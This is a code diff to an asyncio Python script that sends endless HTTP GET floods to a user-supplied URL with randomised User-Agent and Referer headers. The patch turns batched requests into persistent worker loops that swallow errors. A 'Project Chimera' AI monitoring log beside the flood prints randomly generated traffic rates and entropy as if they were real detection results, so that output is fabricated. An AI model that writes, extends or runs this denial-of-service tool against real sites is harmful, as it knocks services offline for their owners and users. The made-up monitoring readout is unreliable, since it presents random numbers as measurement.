@@ -58,38 +58,46 @@ def check_external_connection():
         print("EXTERNAL CONNECTION FAILED (IMF/TLS Block).")
         return False
 
-# --- DDoS SIMULATION ---
-async def simulate_ddos(session, url):
+# --- Continuous DDoS Worker ---
+async def ddos_worker(session, url):
     headers = {
         "User-Agent": random.choice(USER_AGENTS),
         "Referer": random.choice(REFERERS),
     }
+    while True:
+        try:
+            async with session.get(url, headers=headers) as response:
+                await response.read()
+        except Exception:
+            pass  # Ignore errors
+        await asyncio.sleep(0)  # Yield control
+
+# --- AI Monitoring Loop ---
+async def monitoring_loop():
     try:
-        async with session.get(url, headers=headers) as response:
-            await response.text()
-    except Exception:
+        while True:
+            rps = random.uniform(100, 1000)
+            entropy = round(random.uniform(3.0, 5.0), 2)
+            print("--- BEGIN AI MONITORING LOG (PROJECT CHIMERA) ---")
+            if analyze_traffic(rps, NUM_ATTACK_TASKS, entropy):
+                print(f"STATUS: !!! APPLICATION LAYER ATTACK DETECTED !!! Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
+            else:
+                print(f"STATUS: Normal traffic | Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
+            await asyncio.sleep(1)
+    except asyncio.CancelledError:
         pass
 
-# --- Persistent Attack Loop ---
+# --- Run Continuous Attack ---
 async def run_attack(target_url):
     connector = TCPConnector(limit=NUM_ATTACK_TASKS)
     async with ClientSession(connector=connector) as session:
+        workers = [ddos_worker(session, target_url) for _ in range(NUM_ATTACK_TASKS)]
+        monitor = asyncio.create_task(monitoring_loop())
         try:
-            while True:
-                tasks = [simulate_ddos(session, target_url) for _ in range(NUM_ATTACK_TASKS)]
-                await asyncio.gather(*tasks)
-
-                rps = random.uniform(100, 1000)
-                entropy = round(random.uniform(3.0, 5.0), 2)
-                print("--- BEGIN AI MONITORING LOG (PROJECT CHIMERA) ---")
-                if analyze_traffic(rps, NUM_ATTACK_TASKS, entropy):
-                    print(f"STATUS: !!! APPLICATION LAYER ATTACK DETECTED !!! Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
-                else:
-                    print(f"STATUS: Normal traffic | Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
-
-                await asyncio.sleep(1)  # Optional: throttle loop slightly
-        except KeyboardInterrupt:
-            print("Interrupted by user. Stopping attack...")
+            await asyncio.gather(*workers)
+        except asyncio.CancelledError:
+            monitor.cancel()
+            await monitor
 
 # --- ENTRY POINT ---
 async def main():
@@ -113,4 +121,7 @@ async def main():
         await run_attack(stripped_url)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("Interrupted by user. Exiting gracefully...")
